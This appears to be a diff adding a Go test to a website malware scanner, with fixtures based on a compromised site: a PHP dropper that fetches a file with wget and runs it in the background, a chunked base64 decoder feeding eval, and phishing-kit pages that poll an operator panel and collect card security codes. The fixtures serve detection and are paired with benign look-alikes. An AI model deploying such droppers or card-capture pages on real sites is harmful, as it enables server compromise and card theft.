@@ -2073,3 +2073,46 @@ func TestFleetClientSideTelegramPhish(t *testing.T) {
 		}
 	}
 }
+
+// mangomela.com.au (2026-11-06, listed by Google Safe Browsing): a bank
+// kit in a fake wp-merc folder (login copy, a loader asking the operator's
+// panel for the next step, a card security code page), droppers that
+// download and start a program, and a loader evaluating a payload spelled
+// in 200,000 pieces with its decoder's name split. None had a finding.
+// Inert fixtures; look-alikes stay clean.
+func TestFleetOperatorPanelKit(t *testing.T) {
+	s := newScanner(t)
+	var chunks strings.Builder
+	for i := 0; i < 50; i++ {
+		chunks.WriteString(" $z .= \"QUJD\";\n")
+	}
+	for what, c := range map[string]struct{ name, body, sig string }{
+		"dropper":       {"firewall-068bde.php", "<?php\n$u = 'http://203.0.113.9/inert';\n$f = __DIR__ . '/.' . bin2hex(random_bytes(4));\nexec(\"wget -q --no-check-certificate -O \".escapeshellarg($f).\" \".escapeshellarg($u).\" && chmod 700 \".escapeshellarg($f).\" && nohup \".escapeshellarg($f).\" >/dev/null 2>&1 &\");\necho 'ok';\n", "PHP.Dropper.DownloadAndRun"},
+		"split decoder": {"apalah.php", "<?php\ntry {\n $z = \"\";\n" + chunks.String() + " $fn = 'base'.'64_decode';\n $s1 = $fn($z);\n $s2 = $fn($s1);\n eval($s2);\n} catch (\\Throwable $e) {}\n", "PHP.Obfuscated.HiddenDecoder"},
+		"loader":        {"wp-merc/loade830.html", "<html><title>Bank</title><script>const BACKEND_URL='acciones.php';\nfunction comprobarEstado(){fetch(`${BACKEND_URL}?accion=verificar&id=1`).then(r=>r.json()).then(d=>{\nif(d.estado==='sms') window.location.href = 'sms.html?id=1';\nif(d.estado==='cvv') window.location.href = 'cvv.html';\nif(d.estado==='preguntas_usuario') window.location.href = 'preguntase830.html';});}\nsetInterval(comprobarEstado, 3000);</script></html>\n", "Phishing.Kit.OperatorLoader"},
+		"card step":     {"wp-merc/cvv.html", "<html><body><p>CVV solicitados para confirmar tu identidad</p><input class=\"pin\" type=\"tel\" maxlength=\"1\" id=\"c1\"><script>const BACKEND='acciones.php';\nfunction go(v){fetch(BACKEND+'?accion=cvv',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cvv:v})});}</script></body></html>\n", "Phishing.Kit.CardStep"},
+	} {
+		p := "/home/u/public_html/" + c.name
+		if d := s.checkContent(p, extOf(p), []byte(c.body)); d == nil || d.Signature != c.sig || d.Category != CatVirus {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+	for what, body := range map[string]string{
+		// An installer that downloads an archive, without running a program.
+		"download only": "<?php\nexec('wget -q -O /home/u/tmp/backup.zip https://example.test/backup.zip');\n",
+		// A decoder named plainly (the base64 rules judge it).
+		"plain name": "<?php\n$fn = 'base64_decode';\necho $fn($_GET['x'] ?? '');\n",
+		// A shop's order status page polling its server, one next page.
+		"order status": "<html><script>setInterval(()=>fetch('status.php?id=1').then(r=>r.json()).then(d=>{if(d.paid) window.location.href='thanks.html';}),5000);</script></html>\n",
+		// Saving a card through a payment API, no security code step.
+		"save card": "<html><script>fetch('api.php?action=card',{method:'POST',body:new FormData(document.forms[0])});</script></html>\n",
+	} {
+		p := "/home/u/public_html/page.php"
+		if strings.HasPrefix(body, "<html") {
+			p = "/home/u/public_html/page.html"
+		}
+		if d := s.checkContent(p, extOf(p), []byte(body)); d != nil {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+}
